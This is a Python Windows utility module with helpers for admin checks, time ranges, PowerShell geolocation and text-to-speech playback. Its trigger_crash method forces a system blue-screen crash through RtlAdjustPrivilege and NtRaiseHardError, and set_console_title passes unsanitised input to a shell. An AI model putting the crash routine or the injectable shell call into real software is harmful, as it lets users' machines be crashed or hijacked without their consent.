import asyncio
import ctypes
import json
import os
import re
import signal
import subprocess
import sys
import tempfile
import time
from datetime import datetime

import edge_tts
import pygame

from vessel.exceptionHandler import handler


# ----- Utils -----
class Utils:
    @staticmethod
    def ensure_windows() -> bool:
        try:
            return sys.platform.startswith('win')
        except Exception as e:
            handler.exception(f"Failed to check platform: {e}")
            return False

    @staticmethod
    def ensure_admin() -> bool:
        try:
            # noinspection PyUnresolvedReferences
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except Exception:
            return False

    @staticmethod
    def set_console_title(title: str) -> None:
        try:
            subprocess.call(f"title {title}", shell=True)
        except Exception as e:
            handler.exception(f"Failed to set console title: {e}")

    # noinspection PyUnresolvedReferences
    @staticmethod
    def trigger_crash(fake: bool = False):
        if fake:
            raise RuntimeError("Fake crash triggered for testing purposes.")

        ctypes.windll.ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(
            0xC0000022,
            0, 0, 0, 6, ctypes.byref(ctypes.c_uint())
        )

    @staticmethod
    def is_in_time_range(start: str, end: str) -> bool:
        # Validate time format
        time_pattern = r"^\d{2}:\d{2}$"
        if not re.match(time_pattern, start) or not re.match(time_pattern, end):
            raise ValueError("Start and end must be in 'HH:MM' format")

        # Parse hours and minutes
        start_hour, start_minute = map(int, start.split(":"))
        end_hour, end_minute = map(int, end.split(":"))

        # Validate 24-hour range
        if not (0 <= start_hour < 24 and 0 <= end_hour < 24 and 0 <= start_minute < 60 and 0 <= end_minute < 60):
            raise ValueError("Hours must be 00-23 and minutes 00-59")

        # Get current time
        now = datetime.now()
        current_minutes = now.hour * 60 + now.minute
        start_minutes = start_hour * 60 + start_minute
        end_minutes = end_hour * 60 + end_minute

        # Handle ranges that cross midnight
        if start_minutes <= end_minutes:
            return start_minutes <= current_minutes <= end_minutes
        else:
            return current_minutes >= start_minutes or current_minutes <= end_minutes

    @staticmethod
    def contains_secret(keyword: str, item: str) -> bool:
        return bool(re.search(rf"\b{re.escape(keyword)}\b", item, re.IGNORECASE))

    @staticmethod
    def get_windows_location() -> tuple[str, str]:
        try:
            # Multiline PowerShell script
            ps_script = """
            Add-Type -AssemblyName System.Device
            $loc = New-Object System.Device.Location.GeoCoordinateWatcher
            $loc.Start()
            Start-Sleep -Seconds 7
            $loc.Position.Location | ConvertTo-Json
            """
            # Run the PowerShell script
            result = subprocess.check_output(
                ["powershell", "-Command", ps_script],
                text=True
            )
            loc = json.loads(result)
            lat = loc.get("Latitude", "Unknown")
            lon = loc.get("Longitude", "Unknown")
            return lat, lon
        except Exception as e:
            return "Location unavailable", str(e)

    class TTSWrapper:
        def __init__(self, voice="en-US-AriaNeural"):
            self.voice = voice
            self._tmp_file = None
            self._stop_flag = False
            pygame.mixer.init()
            signal.signal(signal.SIGINT, self._handle_interrupt)

        # noinspection PyUnusedLocal
        def _handle_interrupt(self, signum, frame):
            print("\nKeyboardInterrupt caught! Stopping TTS...")
            self._stop_flag = True
            if self._tmp_file and os.path.exists(self._tmp_file):
                try:
                    pygame.mixer.music.stop()
                except Exception:
                    pass
            raise KeyboardInterrupt

        async def _speak_async(self, text: str):
            if self._stop_flag:
                return
            with tempfile.NamedTemporaryFile(delete=False, suffix=".mp3") as f:
                self._tmp_file = f.name

            # generate TTS
            tts = edge_tts.Communicate(text, self.voice)
            await tts.save(self._tmp_file)

            # load and play
            pygame.mixer.music.load(self._tmp_file)
            pygame.mixer.music.play()
            try:
                while pygame.mixer.music.get_busy():
                    if self._stop_flag:
                        pygame.mixer.music.stop()
                        break
                    pygame.time.wait(100)
            finally:
                # wait a short moment to ensure file is released
                time.sleep(0.1)
                if self._tmp_file and os.path.exists(self._tmp_file):
                    try:
                        os.remove(self._tmp_file)
                    except PermissionError:
                        # file still locked, try again later
                        pass
                self._tmp_file = None

        def speak(self, text: str):
            try:
                asyncio.run(self._speak_async(text))
            except KeyboardInterrupt:
                print("TTS stopped by user.")
